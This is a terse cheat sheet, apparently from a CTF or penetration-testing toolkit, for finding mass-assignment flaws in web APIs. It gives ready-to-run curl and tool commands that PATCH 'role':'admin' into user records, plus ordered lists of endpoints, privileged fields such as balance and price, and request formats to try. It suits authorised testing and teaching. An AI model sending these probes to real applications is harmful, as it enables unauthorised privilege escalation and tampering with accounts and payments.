# Quick reference deep — the 60-second mass-assignment card

## The one-line test

```bash
curl -X PATCH "$BASE/users/me" -H 'Content-Type: application/json' \
  -b "$JAR" -d '{"role":"admin"}' && curl -b "$JAR" "$BASE/api/me"
```

`role:"admin"` on the read-back → stored → `GET /admin` → `200` =
confirmed.

## The probe order (5 probes)

1. `PATCH /users/me` `{"role":"admin"}` — widest binder;
2. `PATCH /users/me` `{"profile":{"role":"admin"}}` — nested tunnel;
3. `PATCH /users/me` `{"verified":true}` — second semantic;
4. `PATCH /users/me` `role=admin` — form carrier;
5. `POST /register` `{"role":"admin"}` — create binder.

Stop at the first stored+decision-changed pair.

## The endpoint ladder

`PATCH /users/me` → `PUT /users/:id` → `POST /register` → `POST
/orders` → `POST /import` → GraphQL mutation → `POST /admin/*`.

## The field ladder

`role` → `is_admin`/`isAdmin`/`is_staff` → `verified`/`is_active`/
`approved` → `balance`/`credits` → `price`/`discount`/`total` →
`plan`/`tier` → `permissions`/`groups`/`roles` → `_t`/`type`.

## The carrier ladder

flat JSON → form → nested `{"profile":{"role":..}}` → prefixed
`user[role]` → array `role[]`/`roles:[..]` → typed `role:1`/`role:true`/
`groups:[{id:1}]` → `PUT` → `?_method=` → `?role=` query → GraphQL.

## The falsifier read

| Result | Depth | Next |
|---|---|---|
| `400 unknown property` | content-type | form, multipart |
| `200`+drop | endpoint | nested, PATCH, PUT |
| drop everywhere | binder-family | /import, GraphQL, /admin |
| stored+`403` | inert field | is_staff, permissions, JWT |
| no priv fields | model | class dead → decide.py |

## The evidence pair

- **class**: `GET` read-back `"role":"admin"` vs control `"user"`;
- **impact**: `GET /admin` `200` (the gated route/total/state).

## The commands

```bash
# the tool
python3 tools/web/binding_probe.py --url "$BASE/api/register" \
  --body 'username=p&password=x' --readback "$BASE/api/me"

# the record
python3 tools/hooks.py post-probe <ch> \
  --request "PATCH /users/me role=admin" --verdict confirms \
  --class web-mass-assignment --hypothesis-id <id> \
  --evidence-kind class --evidence '"role":"admin"' \
  --response "$(cat rb.txt)"
```

## The boundary

`author_id:9` → `web-idor`; `__proto__` → `web-prototype-pollution`;
`$`-ops → `web-nosqli`; step-skip → `web-logic-flaw`.

## The rule

Stored + changed-decision = finding. Stored alone = null result.
